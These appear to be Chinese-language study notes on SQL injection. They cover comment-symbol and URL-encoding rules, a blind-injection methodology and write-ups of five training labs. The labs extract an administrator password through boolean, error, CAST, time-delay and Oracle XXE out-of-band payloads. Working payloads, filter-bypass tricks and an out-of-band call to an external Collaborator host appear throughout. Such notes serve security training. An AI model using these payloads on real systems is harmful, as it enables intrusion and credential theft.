# SQL Injection

> **参考：** [PostgreSQL](../../数据库/PostgreSQL.md) | [Oracle](../../数据库/Oracle.md) | [MySQL](../../数据库/MySQL.md) | [MSSQL](../../数据库/Microsoft%20SQL%20Server.md) | [数据库对比](../../数据库/数据库对比.md)

## 注释符号与 URL 编码规则

### `--` vs `#` vs `/**/`：什么时候用哪个？

| 注释符 | 适用数据库 | 关键条件 | 示例 |
|--------|-----------|---------|------|
| `-- ` | 所有 | **MySQL 中 `--` 后必须有空格或控制字符**，其他数据库可有可无 | `' OR 1=1 -- ` |
| `--%20` | 所有 | 同上，URL 编码的空格，适合 HTTP 传输 | `' OR 1=1 --%20` |
| `--+` | 所有 | `+` 在 URL 中解码为空格，确保 MySQL 兼容 | `' OR 1=1 --+` |
| `#` | **仅 MySQL / MariaDB** | PostgreSQL / Oracle / MSSQL 都不支持 | `' OR 1=1 #` |
| `%23` | **仅 MySQL / MariaDB** | `#` 的 URL 编码形式 | `' OR 1=1 %23` |
| `/**/` | 所有 | 多行注释，最通用；也可替代空格绕过过滤 | `'/**/OR/**/1=1/**/` |

**为什么 `#` 只有 MySQL 能用？**

MySQL 将 `#` 设计为单行注释符（兼容一些历史 shell 脚本习惯）。PostgreSQL、Oracle、MSSQL 都不认 `#`。如果在非 MySQL 数据库上用 `#`，会被当作普通字符或运算符，导致语法错误或注入失败。

**为什么 `--` 在 MySQL 中需要后面跟空格？**

MySQL 对 `--` 的解析遵循 SQL 标准：`--` 后必须跟一个空格（或换行/制表符）才算注释开始。如果写 `--SOMETHING`，MySQL 会认为这是一个以 `--` 开头的标识符而非注释。`--+` 中的 `+` 在 URL 解码后变成空格，所以 `--+` 是 MySQL 盲注的常见结尾。

**快速判断规则：**
- 能确认是 MySQL → 优先用 `#` 或 `%23`（不需要管空格问题）
- 不确定数据库类型 → 用 `-- `（带空格）或 `--+`（最通用，覆盖所有数据库 + URL 传输）
- 空格被过滤 → 用 `/**/` 替代所有空白字符

### URL 编码：什么时候必须编码？

核心原则：**当特殊字符在 HTTP 传输层有特定含义时，必须编码；如果字符只对 SQL 有意义、对 HTTP 无影响，可以不编码。**

#### 必须编码的字符

| 字符 | URL 编码 | HTTP 层的含义 | 场景 |
|------|---------|-------------|------|
| `;` | `%3B` | GET 参数分隔符 / Cookie 属性分隔符 | **Cookie 注入中分号必须先编码**，否则被当作 cookie 结束 |
| `=` | `%3D` | 参数键值分隔符 | 如果 `=` 是 payload 的一部分而非分隔符，需要编码 |
| `&` | `%26` | GET 多参数分隔符 | GET 注入中 `&` 会切断当前参数 |
| `#` | `%23` | URL 片段锚点，浏览器不发送 `#` 之后内容 | GET 注入中用 `#` 注释必须编码 |
| 空格 | `%20` 或 `+` | URL 中空格的分隔语意 | 确保空格被正确传输到 SQL 中 |
| `%` | `%25` | 转义前缀 | 当 `%` 是字面值而非编码前缀时（如 LIKE '%x%'） |

#### 可以不编码的字符

| 字符 | 说明 |
|------|------|
| `'` (单引号) | HTTP 不特殊处理，直接传输即可（除非应用层做了额外过滤） |
| `(` `)` | HTTP 允许括号出现在 URL 中 |
| `>` `<` | 理论上应编码，但实践中大多数服务器接受原始形式 |
| `\|\|` | 无 HTTP 特殊含义 |

#### 关键场景速查

```
场景一：GET 参数注入
  URL: ?id=1' AND 1=1 --
  问题：-- 后面的空格可能丢失；# 会被浏览器当作锚点不发送
  解决：?id=1' AND 1=1 --+      （+ 解码为空格，最通用）
        ?id=1' AND 1=1 %23      （仅 MySQL，%23 = #）

场景二：Cookie 注入
  Cookie: TrackingId=xxx' AND 1=1 --
  问题：; 是 Cookie 分隔符，直接使用会截断
  解决：TrackingId=xxx' %3B SELECT pg_sleep(5) --+
        （分号 → %3B，保证被当作 SQL 分号而非 Cookie 分隔符）

场景三：POST body 注入（JSON / form-urlencoded）
  JSON 中：{"id": "1' AND 1=1 --"}  → 直接写，无需额外编码
  form 中：id=1' AND 1=1 --         → 同 GET，注意 & 和 = 问题

场景四：XML / XXE 嵌入 SQL 注入
  XML 中的 < > " 等必须用实体编码或 URL 编码
  且不能保留换行和缩进（会破坏 SQL 语法）
```

#### 实战口诀

1. **Cookie 里看到 `;` → 先想到 `%3B`**
2. **不确定用什么注释 → 用 `--+`（覆盖所有库 + URL 安全）**
3. **GET 参数中 `#` → 必须编码成 `%23`，否则浏览器不发 `#` 后面的内容**
4. **判断出 MySQL 后 → 换成 `#` / `%23`，更简洁安全**

---

## 盲注方法论 / Blind SQL Injection Methodology

从以下五个 Lab 中提炼的通用思路框架：

### 阶段一：注入点探测与确认

| 步骤 | 操作 | 目的 |
|------|------|------|
| 1.1 触发异常 | 输入单引号 `'` | 观察响应变化（500/报错/页面内容变化），确认参数是否被拼入 SQL |
| 1.2 修复语法 | 输入双引号 `''` 或注释符 `--` | 如果异常消失，说明单引号确实破坏了查询结构，确认注入点 |
| 1.3 确定注入类型 | 根据上下文选择闭合方式 | cookie 注入 vs GET/POST 参数注入；字符串型 vs 数字型 |

### 阶段二：数据库类型识别

不同数据库有不同的指纹特征：

| 数据库 | 指纹测试 | 说明 |
|--------|----------|------|
| Oracle | `SELECT '' FROM dual` 或 `ROWNUM` | `dual` 是 Oracle 特有的虚拟表 |
| PostgreSQL | `pg_sleep()` | PostgreSQL 特有函数 |
| MySQL | `SLEEP()` 或 `#` 注释符 | MySQL 特有 |
| 通用 | 字符串连接符 `\|\|` vs `+` vs `CONCAT()` | Oracle/PostgreSQL 用 `\|\|`，MSSQL 用 `+`，MySQL 用 `CONCAT()` 或空格 |

**关键思路**：不要猜测数据库类型，用数据库特有的函数或语法去验证。

### 阶段三：信息提取策略选择

根据应用对查询结果的处理方式，选择对应的盲注策略：

| 策略 | 适用场景 | 核心原理 | Lab 示例 |
|------|----------|----------|----------|
| **条件响应** (Conditional Responses) | 页面内容因查询结果不同而变化（如"Welcome back"消息） | 构造布尔条件，通过页面内容差异推断真假 | Lab 1 |
| **条件错误** (Conditional Errors) | 错误信息可见或 HTTP 状态码可区分 | 条件为真时触发除零等可控错误，通过是否报错推断 | Lab 2, 3 |
| **时间延迟** (Time Delays) | 页面响应无任何内容差异 | 条件为真时触发延迟函数，通过响应时间推断 | Lab 4 |
| **带外交互** (Out-of-Band) | 数据库有出站网络访问能力 | 构造 DNS/HTTP 请求到外部服务器，通过外带信道获取数据 | Lab 5 |
| **可见错误** (Visible Errors) | 错误信息直接回显在页面 | 利用 CAST 等类型转换函数，将数据嵌入错误消息中直接读出 | Lab 3 |

**选择逻辑**：先试条件响应（最省力），不行再试条件错误，再不行试时间延迟，最后考虑 OOB。

### 阶段四：数据提取三步走

无论哪种盲注策略，数据提取都遵循相同的三步：

```
1. 确认表是否存在 → 2. 确认目标行是否存在 → 3. 获取目标列长度 → 4. 逐字符破解目标数据
```

#### 4.1 确认表存在

```sql
-- PostgreSQL / MySQL 通用
AND (SELECT 'a' FROM users LIMIT 1)='a'

-- Oracle（需要 FROM dual 或使用 ROWNUM）
||(SELECT '' FROM users WHERE ROWNUM=1)||'
```

#### 4.2 确认目标行存在

```sql
-- PostgreSQL
AND (SELECT username FROM users WHERE username='administrator')='administrator'

-- Oracle（条件错误法）
||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

#### 4.3 获取数据长度

```sql
-- 条件响应法 (PostgreSQL)
AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20

-- 条件错误法 (Oracle)
||(SELECT CASE WHEN LENGTH(password)=20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

-- 时间延迟法 (PostgreSQL)
'; SELECT CASE WHEN LENGTH(password)=20 THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
```

**注意**：使用二分查找或 `>=N` 方式逼近长度，比逐次等号判断更高效。使用 Burp Intruder 时可用 Sniper 模式逐次测试。

#### 4.4 逐字符破解

```sql
-- SUBSTRING / SUBSTR 函数语法因数据库而异
-- PostgreSQL: SUBSTRING(string, position, length)
-- Oracle: SUBSTR(string, position, length)
-- MySQL: SUBSTRING(string, position, length)
```

使用 Burp Intruder 的 **Cluster bomb** 模式：
- Payload 1：位置 (1-20)
- Payload 2：字符 (a-z, 0-9)

### 阶段五：常见障碍与解决思路

| 障碍 | 表现 | 解决思路 |
|------|------|----------|
| **字符截断** | payload 后半部分被截掉 | 1) 缩短 payload；2) 删除 cookie 原始值释放空间（Lab 3 技巧）；3) 换用更短的函数名 |
| **注释符被过滤** | `--` 无效 | 尝试 `#`（MySQL）或 `/* */` 多行注释 |
| **空格被过滤** | 语法错误 | 用 `/**/`、`%09`(TAB)、`%0a`(换行) 替代空格 |
| **等于号被过滤** | `=` 无法使用 | 用 `LIKE`、`REGEXP`、`>` `<`、`BETWEEN` 替代 |
| **单引号被转义** | `\'` 无法闭合 | 如果数据库是 Oracle，尝试 `\|\|` 拼接而不是引号闭合 |
| **多语句不支持** | `;` 分隔无效 | 改用表达式注入（`\|\|`、`AND`、`OR` 等），不用分号 |

---

## Lab 1: Blind SQL injection with conditional responses

- **注入点**：Cookie 参数 `TrackingId`
- **数据库**：PostgreSQL
- **策略**：条件响应法 —— 页面在查询成功时显示 "Welcome back"
- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`

### Step 1: 验证 users 表存在

```sql
TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT 'a' FROM users LIMIT 1)='a
```

**执行逻辑**：
- `SELECT 'a' FROM users LIMIT 1`：尝试从 `users` 表查询字面量 `'a'`
- 如果 `users` 表存在且有数据 → 子查询返回 `'a'`
- 外层比较：`'a' = 'a'` → TRUE → 页面显示 "Welcome back"
- 如果 `users` 表不存在 → 查询失败 → 页面不显示 "Welcome back"

**优点**：不依赖具体列名（只验证表是否存在），使用 `LIMIT 1` 减少负载。

### Step 2: 确定 password 长度

```sql
-- 先判断 >=10
TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>=10 AND '1'='1
-- 结果：Welcome back → 长度 >=10

-- 再判断 >=20
TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>=20 AND '1'='1
-- 结果：Welcome back → 长度 >=20

-- 确认 =20
TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 AND '1'='1
-- 结果：Welcome back → 长度 = 20
```

**改进建议**：使用 Sniper 模式 + 二分查找可以更快收敛。

### Step 3: 逐字符爆破密码

使用 Burp Intruder Cluster bomb 模式：

```sql
TrackingId=QlwkDggWZ9kB8CzU' AND (SELECT SUBSTRING(password,§1§,1) FROM users WHERE username='administrator')='§a§' AND '1'='1;
```

- Payload 1：位置 1-20
- Payload 2：字符集 a-z, 0-9

**最终密码**：`d73k6yg4xh9vjpygf33j`

---

## Lab 2: Blind SQL injection with conditional errors

- **注入点**：Cookie 参数 `TrackingId`
- **数据库**：Oracle
- **策略**：条件错误法 —— 通过是否触发 500 错误来判断条件真假
- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`

### Step 1: 确认注入点

```sql
-- 单引号破坏语法
TrackingId=XBx3CA3eobxwQaIx'
-- 结果：500 错误

-- 双引号修复语法
TrackingId=XBx3CA3eobxwQaIx''
-- 结果：200 正常
```

### Step 2: 确认数据库为 Oracle

```sql
TrackingId=XBx3CA3eobxwQaIx'||(SELECT '' FROM dual)||'
-- 结果：无报错 → 确认 Oracle 数据库
```

`||` 是 Oracle 的字符串连接符；`dual` 是 Oracle 特有的虚拟表。如果这两个都生效，就是 Oracle。

### Step 3: 验证 users 表存在

```sql
TrackingId=XBx3CA3eobxwQaIx'||(SELECT '' FROM users WHERE ROWNUM=1)||'
-- 结果：200 → users 表存在
```

Oracle 用 `ROWNUM` 而非 `LIMIT` 限制行数。

### Step 4: 验证 administrator 用户存在（引入条件错误技巧）

```sql
TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

**Payload 解析**：
- `CASE WHEN (1=1)`：条件始终为真
- `THEN TO_CHAR(1/0)`：执行除零操作 → 触发错误
- `ELSE ''`：条件为假时返回空字符串（不触发错误）
- `FROM users WHERE username='administrator'`：如果该用户存在，子查询返回一行 → CASE 被执行 → 除零错误

**结果**：HTTP 500 → 用户存在且条件错误技术可行

**核心思路**：`TO_CHAR(1/0)` 是 Oracle 盲注中制造可控错误的标准方法。

### Step 5: 确定密码长度

```sql
TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN LENGTH(password)=§12§ THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

使用 Burp Intruder Sniper 模式测试数字 1-30。
**结果**：长度 = 20

### Step 6: 逐字符爆破密码

```sql
TrackingId=XBx3CA3eobxwQaIx'||(SELECT CASE WHEN SUBSTR(password,§1§,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
```

- Payload 1：位置 1-20
- Payload 2：字符集 a-z, 0-9

**Oracle 注意**：使用 `SUBSTR()` 而非 PostgreSQL 的 `SUBSTRING()`。

**最终密码**：`6459v4yiqmevI4h7h7jc`

---

## Lab 3: Visible error-based SQL injection

- **注入点**：Cookie 参数 `TrackingId`
- **数据库**：PostgreSQL
- **策略**：可见错误法 —— 利用 CAST 类型转换将数据嵌入错误消息中直接显示
- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`

### Step 1: 确认注入点

```sql
TrackingId=OTKrj23YuTg0vnN9'
-- 返回错误（含完整 SQL 片段）：
-- Unterminated string literal started at position 52 in SQL 
-- SELECT * FROM tracking WHERE id = 'OTKrj23YuTg0vnN9''. Expected char

TrackingId=OTKrj23YuTg0vnN9''
-- 正常返回
```

### Step 2: 判断数据库类型

```sql
-- Oracle 测试
TrackingId=OTKrj23YuTg0vnN9'||(SELECT '' FROM dual)||'
-- 返回：ERROR: relation "dual" does not exist → 不是 Oracle

-- 结论：PostgreSQL（结合后续 pg_sleep 等验证）
```

### Step 3: 验证 users 表存在

```sql
-- 通用方法（PostgreSQL）
TrackingId=OTKrj23YuTg0vnN9' AND (SELECT 'a' FROM users LIMIT 1)='a'--
```

注意这里使用 `--` 注释掉后续内容，避免语法错误。

### Step 4: 利用 CAST 泄露数据（可见错误法的核心）

```sql
-- 先测试 CAST 语法是否可用
TrackingId=OTKrj23YuTg0vnN9' AND CAST((SELECT 1) AS int)--
-- 返回：ERROR: argument of AND must be type boolean, not type integer
-- (CAST 返回整数而非布尔值，语法不对)

-- 修正为布尔表达式
TrackingId=OTKrj23YuTg0vnN9' AND 1=CAST((SELECT 1) AS int)--
-- 正常返回 → CAST 语法可用
```

**关键洞察**：`CAST()` 将数据转换为数字类型失败时会报错，且错误消息中包含原始数据内容。这让我们可以直接"看"到查询结果。

### Step 5: 字符截断问题与解决

```sql
-- 原始 payload（被截断）
TrackingId=OTKrj23YuTg0vnN9' AND 1=CAST((SELECT username FROM users) AS int)--
-- 返回：Unterminated string literal...Expected char
-- 原因：payload 太长，-- 注释部分被截断

-- 解决方案：删除原始 TrackingId 值，只保留单引号
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
-- 返回：ERROR: more than one row returned by a subquery used as an expression
```

**这个技巧很重要**：当 payload 被截断时，可以考虑删除原始参数值来释放字符空间。

### Step 6: 限制返回行数，泄露数据

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
-- 返回：ERROR: invalid input syntax for type integer: "administrator"
-- 用户名泄露！

TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
-- 返回：ERROR: invalid input syntax for type integer: "zrk05uh9ektq4f51j9zv"
-- 密码泄露！
```

**CAST 可见错误法的核心原理**：
```
SELECT CAST('字符串数据' AS int) → 类型转换失败
错误消息包含：invalid input syntax for type integer: "字符串数据"
数据被直接嵌入了错误消息中
```

**最终密码**：`zrk05uh9ektq4f51j9zv`

---

## Lab 4: Blind SQL injection with time delays and information retrieval

- **注入点**：Cookie 参数 `TrackingId`
- **数据库**：PostgreSQL
- **策略**：时间延迟法 —— 通过是否触发延迟来判断条件真假
- **目标**：获取 `users` 表中 `username='administrator'` 的 `password`

### Step 1: 测试延迟函数

```sql
-- 表达式注入方式
TrackingId=qp5zQHYcGlRtSzCL' || pg_sleep(10) --+
-- 结果：触发 10 秒等待 → pg_sleep 可用
```

### Step 2: 多语句注入 vs 表达式注入

```sql
-- 表达式注入（当前生效的方式）
' || pg_sleep(10) --

-- 多语句注入（需要分号）
'; SELECT pg_sleep(10) --
```

| 方式 | 语法 | 适用场景 |
|------|------|----------|
| 表达式注入 | `' \|\| pg_sleep(10) --` | 作为字符串连接或布尔表达式的一部分 |
| 多语句注入 | `'; SELECT pg_sleep(10) --` | 数据库/驱动支持多语句执行 |

**注意**：cookie 中直接使用分号 `;` 可能被解析为 cookie 分隔符，需要 URL 编码为 `%3B`。

```sql
TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT pg_sleep(10) --+
```

### Step 3: 验证 CASE WHEN 条件延迟可用

```sql
TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (1=1) THEN pg_sleep(4) ELSE pg_sleep(0) END --+
-- 结果：触发 4 秒延迟 → 可用
```

### Step 4: 确定密码长度

```sql
TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (LENGTH(password)=§1§) THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator' --+
```

Burp Intruder Sniper 模式。
**结果**：长度 = 20

### Step 5: 逐字符爆破密码

```sql
TrackingId=qp5zQHYcGlRtSzCL' %3B SELECT CASE WHEN (SUBSTRING(password,§1§,1)='§a§') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users WHERE username='administrator' --+
```

**时间盲注提示**：Burp Intruder 攻击完成后，按 "Response received" 列排序，延迟 4 秒以上的响应就是正确字符。

**最终密码**：`jhyiwckngv95rr8fi58x`

---

## Lab 5: Blind SQL injection with out-of-band interaction

- **注入点**：Cookie 参数 `TrackingId`
- **数据库**：Oracle
- **策略**：带外交互法 —— 利用 Oracle XML 函数发起外部 DNS/HTTP 请求
- **目标**：验证 OOB 通道可行性（本 Lab 只需触发 DNS 查询）

### Step 1: 获取 Burp Collaborator 子域名

```
f6m4x36e7l55drydz4qxh5ez3q9hxmlb.oastify.com
```

### Step 2: 构造 XXE + SQL 注入组合 Payload

原始 payload（含格式化）：

```sql
TrackingId=6OaAmWTgObppj28w' UNION SELECT EXTRACTVALUE(
    xmltype(
        '<?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [
            <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/">
            %remote;
        ]>'
    ),
    '/l'
) FROM dual--
```

**Payload 语法解析**：

| 组件 | 作用 |
|------|------|
| `6OaAmWTgObppj28w'` | 闭合原始查询字符串 |
| `UNION SELECT` | 联合查询，注入恶意 payload |
| `EXTRACTVALUE(xmltype(...), '/l')` | Oracle XML 函数，解析 XML 并触发外部实体 |
| `<!ENTITY % remote SYSTEM "http://.../">` | XXE：声明外部实体，指向 Collaborator 地址 |
| `%remote;` | 引用实体，触发 DNS/HTTP 请求 |
| `FROM dual` | Oracle 必需的虚拟表 |
| `--` | 注释掉后续 SQL |

### Step 3: URL 编码（关键！）

XML 中的特殊字符必须编码，且**不能保留格式化（换行、缩进）**——否则会破坏 SQL 语法。

| 编码 | 原始字符 |
|------|----------|
| `%3f` | `?` |
| `%3d` | `=` |
| `%22` | `"` |
| `%3a` | `:` |
| `%25` | `%` |
| `%3b` | `;` |

**最终发送的 payload（无格式化，已 URL 编码）**：

```
6OaAmWTgObppj28w' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "http://f6m4x36e7l55drydz4qxh5ez3q9hxmlb.oastify.com/">%remote;]>'),'/l') FROM dual--
```

### Step 4: 验证结果

在 Burp Collaborator 中查看 DNS/HTTP 请求记录，确认 Oracle 数据库发起了外部请求。

---

## 各 Lab 策略对比总结

| | Lab 1 | Lab 2 | Lab 3 | Lab 4 | Lab 5 |
|---|---|---|---|---|---|
| **数据库** | PostgreSQL | Oracle | PostgreSQL | PostgreSQL | Oracle |
| **策略** | 条件响应 | 条件错误 | 可见错误 | 时间延迟 | 带外交互 |
| **判断依据** | "Welcome back" 的出现/消失 | HTTP 500 的出现/消失 | 错误消息内容 | 响应时间差异 | DNS 查询记录 |
| **效率** | 高（直接看响应） | 中（需要区分错误类型） | 极高（直接泄露数据） | 低（每次请求需等待） | 低（依赖外部服务） |
| **核心技巧** | 布尔表达式 + 内容差异 | `TO_CHAR(1/0)` 制造可控错误 | `CAST()` 将数据嵌入错误消息 | `pg_sleep()` 延迟函数 | Oracle XML + XXE 外带 |
| **特殊注意** | 简单的布尔盲注 | Oracle 特有语法（`dual`, `ROWNUM`, `\|\|`） | 删除原始值释放字符空间 | 分号需 URL 编码 | XML 需 URL 编码 + 去格式化 |

---

## 补充：通用思路框架

```
1. 探测注入点
   ├── 输入 '  观察响应变化
   ├── 输入 '' 或 --  确认语法修复
   └── 确定闭合方式（字符串型/数字型；cookie/GET/POST）

2. 识别数据库类型
   ├── Oracle: dual 表, ROWNUM, TO_CHAR(1/0), || 连接
   ├── PostgreSQL: pg_sleep(), SUBSTRING(), LIMIT
   └── MySQL: SLEEP(), # 注释, CONCAT()

3. 选择盲注策略（按优先级）
   ├── 页面有内容差异 → 条件响应法（Lab 1）
   ├── 错误信息可见/状态码可区分 → 条件错误法（Lab 2）
   ├── 错误消息回显 → 可见错误法（Lab 3）★ 最高效
   ├── 仅有响应时间可观测 → 时间延迟法（Lab 4）
   └── 数据库可出站 → 带外交互法（Lab 5）

4. 数据提取（三步）
   ├── 确认表/行存在 → 确认目标数据长度 → 逐字符爆破
   └── 工具：Burp Intruder (Sniper 测长度, Cluster bomb 爆字符)

5. 遇到障碍时
   ├── Payload 被截断 → 删除原始值释放空间 / 缩短 payload
   ├── 特殊字符失效 → URL 编码（尤其 cookie 中的 ; 需要 %3B）
   ├── 注释符失效 → 换用 # 或 /* */ 或闭合后续语法
   └── 关键词被过滤 → 尝试大小写混写 / 双写绕过 / 等价函数替换
```
